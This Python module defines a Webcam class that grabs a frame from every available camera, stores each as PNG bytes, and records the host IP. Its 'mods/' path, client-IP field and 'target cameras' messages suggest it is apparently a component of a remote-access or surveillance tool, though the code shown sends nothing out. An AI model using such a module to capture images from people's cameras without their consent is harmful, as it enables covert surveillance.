# mods/webcam.py
import cv2
import socket
import io
from PIL import Image

class Webcam:
    def __init__(self, max_devices=10):
        self.max_devices = max_devices
        self.client_info = self._get_client_info()
        self.SUCCESS = False
        self.captures = {}  

    def _get_client_info(self):
        class DummyClient:
            def __init__(self):
                self.ip = self.get_ip()

            def get_ip(self):
                try:
                    return socket.gethostbyname(socket.gethostname())
                except:
                    return "0.0.0.0"
        return DummyClient()

    def is_device_available(self, index):
        cap = cv2.VideoCapture(index)
        available = cap.isOpened()
        cap.release()
        return available

    def capture_all(self):
        self.captures = {}
        found_any = False

        for idx in range(self.max_devices):
            try:
                cap = cv2.VideoCapture(idx)
                if not cap.isOpened():
                    print(f"[!] Camera index {idx} is not available.")
                    continue

                ret, frame = cap.read()
                cap.release()

                if not ret:
                    print(f"[!] Failed to read frame from camera {idx}.")
                    continue

                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame_rgb)
                buffer = io.BytesIO()
                img.save(buffer, format='PNG')
                self.captures[idx] = buffer.getvalue()
                found_any = True

                print(f"[OK] Captured image from camera {idx}")

            except Exception as e:
                print(f"[!] No additional target cameras found with camera {idx}: {e}")

        self.SUCCESS = found_any
        return self.captures


    def capture(self, device_index):
        try:
            cam = cv2.VideoCapture(device_index)
            if not cam.isOpened():
                return f"Device {device_index} not available"

            ret, frame = cam.read()
            cam.release()

            if not ret:
                return f"Capture failed on device {device_index}"

            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            return buffer.getvalue()
        except Exception as e:
            return f"Error on device {device_index}: {e}"
